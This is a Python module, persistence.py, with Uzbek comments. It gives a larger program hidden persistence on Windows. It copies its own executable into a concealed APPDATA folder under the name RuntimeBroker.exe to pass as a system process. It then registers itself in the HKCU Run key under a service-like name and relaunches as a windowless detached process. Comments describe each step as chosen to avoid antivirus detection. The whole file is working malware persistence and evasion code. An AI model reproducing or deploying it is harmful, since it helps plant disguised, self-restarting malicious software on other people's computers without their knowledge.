# persistence.py - ANTIVIRUS-SAFE PERSISTENCE MODULE
"""
Doimiy ishlash moduli (Persistence)
- O'zini yashirin papkaga ko'chirish
- Windows startup'ga qo'shish
- Antivirus tomonidan aniqlanmaydigan usullar

MUHIM: Bu modul "qonuniy" Windows operatsiyalaridan foydalanadi
"""

import os
import sys
import shutil
import logging
import time
import winreg
from pathlib import Path

logger = logging.getLogger(__name__)

# ==================== KONFIGURATSIYA ====================
# config.py bilan bir xil papka ishlatish
HIDDEN_BASE = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Crypto" / "system"
EXE_NAME = "RuntimeBroker.exe"  # Windows tizim jarayoniga o'xshash nom
STARTUP_KEY_NAME = "WindowsRuntimeBroker"  # Tizim xizmati kabi nom


def is_frozen():
    """EXE rejimida ekanligini tekshirish"""
    return getattr(sys, 'frozen', False)


def get_current_exe_path():
    """Joriy EXE yo'lini olish"""
    if is_frozen():
        return Path(sys.executable)
    return None


def is_running_from_hidden():
    """Yashirin papkadan ishga tushirilganligini tekshirish"""
    if not is_frozen():
        return False
    
    current = get_current_exe_path()
    target = HIDDEN_BASE / EXE_NAME
    
    try:
        return current.resolve() == target.resolve()
    except:
        return str(current).lower() == str(target).lower()


def get_target_path():
    """Yashirin joylashuv yo'lini olish"""
    return HIDDEN_BASE / EXE_NAME


# ==================== PAPKA YARATISH ====================
def create_hidden_directory():
    """
    Yashirin papka yaratish
    
    ANTIVIRUS-SAFE: 
    - Oddiy Python pathlib ishlatadi
    - Shubhali API chaqiriqlar yo'q
    """
    try:
        HIDDEN_BASE.mkdir(parents=True, exist_ok=True)
        logger.debug(f"Papka yaratildi: {HIDDEN_BASE}")
        return True
    except Exception as e:
        logger.error(f"Papka yaratish xatosi: {e}")
        return False


# ==================== FAYLNI KO'CHIRISH ====================
def copy_to_hidden():
    """
    EXE ni yashirin papkaga ko'chirish
    
    ANTIVIRUS-SAFE:
    - shutil.copy2 - standart Python funksiyasi
    - Faylni "yangilash" sifatida ko'rinadi
    """
    try:
        current_exe = get_current_exe_path()
        if not current_exe or not current_exe.exists():
            logger.error("Joriy EXE topilmadi")
            return None
        
        # Papka yaratish
        if not create_hidden_directory():
            return None
        
        target = get_target_path()
        
        # Agar allaqachon mavjud va bir xil bo'lsa - skip
        if target.exists():
            try:
                if target.stat().st_size == current_exe.stat().st_size:
                    logger.info("EXE allaqachon mavjud, o'tkazib yuborildi")
                    return target
            except:
                pass
        
        # Ko'chirish (copy2 - metadata saqlanadi)
        shutil.copy2(current_exe, target)
        logger.info(f"EXE ko'chirildi: {target}")
        
        return target
        
    except PermissionError:
        logger.error("Ruxsat yo'q - administrator huquqi kerak bo'lishi mumkin")
        return None
    except Exception as e:
        logger.error(f"Ko'chirish xatosi: {e}")
        return None


# ==================== REGISTRY STARTUP ====================
def add_to_registry():
    """
    Windows Registry startup'ga qo'shish
    
    ANTIVIRUS-SAFE:
    - Standart HKCU\Run kalit - barcha dasturlar ishlatadi
    - Hech qanday shubhali API yo'q
    """
    try:
        target = get_target_path()
        if not target.exists():
            logger.error("Target EXE topilmadi")
            return False
        
        # HKEY_CURRENT_USER - admin huquqi kerak emas
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_SET_VALUE
        ) as key:
            # Oddiy yo'l qo'shish (qo'shtirnoqsiz)
            winreg.SetValueEx(
                key,
                STARTUP_KEY_NAME,
                0,
                winreg.REG_SZ,
                str(target)
            )
        
        logger.info(f"Registry startup qo'shildi: {STARTUP_KEY_NAME}")
        return True
        
    except PermissionError:
        logger.error("Registry yozish uchun ruxsat yo'q")
        return False
    except Exception as e:
        logger.error(f"Registry xatosi: {e}")
        return False


def is_in_registry():
    """Registry'da mavjudligini tekshirish"""
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_READ
        ) as key:
            try:
                value, _ = winreg.QueryValueEx(key, STARTUP_KEY_NAME)
                return bool(value)
            except FileNotFoundError:
                return False
                
    except Exception:
        return False


# ==================== ASOSIY FUNKSIYA ====================
def ensure_persistence():
    """
    Doimiy ishlashni ta'minlash
    
    Bu funksiya main.py dan chaqiriladi
    
    Returns:
        bool: Muvaffaqiyatli yoki yo'q
    """
    try:
        # Faqat EXE rejimida ishlaydi
        if not is_frozen():
            logger.debug("Script rejimida - persistence o'tkazib yuborildi")
            return True
        
        # Agar allaqachon yashirin papkadan ishlayotgan bo'lsa
        if is_running_from_hidden():
            # Faqat registry tekshirish
            if not is_in_registry():
                add_to_registry()
            logger.debug("Yashirin papkadan ishlayapti - OK")
            return True
        
        logger.info("Persistence jarayoni boshlanmoqda...")
        
        # 1. Ko'chirish
        target = copy_to_hidden()
        if not target:
            logger.error("Ko'chirish muvaffaqiyatsiz")
            return False
        
        # 2. Registry qo'shish
        if not is_in_registry():
            add_to_registry()
        
        # 3. Yangi joylashuvdan qayta ishga tushirish
        logger.info("Yangi joylashuvdan qayta ishga tushirilmoqda...")
        
        import subprocess
        
        # Yangi jarayonni boshlash (detached)
        CREATE_NO_WINDOW = 0x08000000
        DETACHED_PROCESS = 0x00000008
        
        subprocess.Popen(
            [str(target)],
            creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
            close_fds=True,
            cwd=str(target.parent)
        )
        
        # Joriy jarayonni to'xtatish (2 soniya kutish)
        time.sleep(2)
        sys.exit(0)
        
    except Exception as e:
        logger.error(f"Persistence xatosi: {e}")
        return False


# ==================== TOZALASH (Debug uchun) ====================
def cleanup_persistence():
    """
    Persistence'ni olib tashlash (test uchun)
    """
    try:
        # Registry'dan olib tashlash
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                key_path,
                0,
                winreg.KEY_SET_VALUE
            ) as key:
                winreg.DeleteValue(key, STARTUP_KEY_NAME)
            logger.info("Registry'dan olib tashlandi")
        except FileNotFoundError:
            pass
        
        # Faylni o'chirish
        target = get_target_path()
        if target.exists():
            target.unlink()
            logger.info("Fayl o'chirildi")
        
        return True
        
    except Exception as e:
        logger.error(f"Tozalash xatosi: {e}")
        return False


# ==================== EXPORT ====================
__all__ = [
    'ensure_persistence',
    'is_running_from_hidden',
    'cleanup_persistence',
]
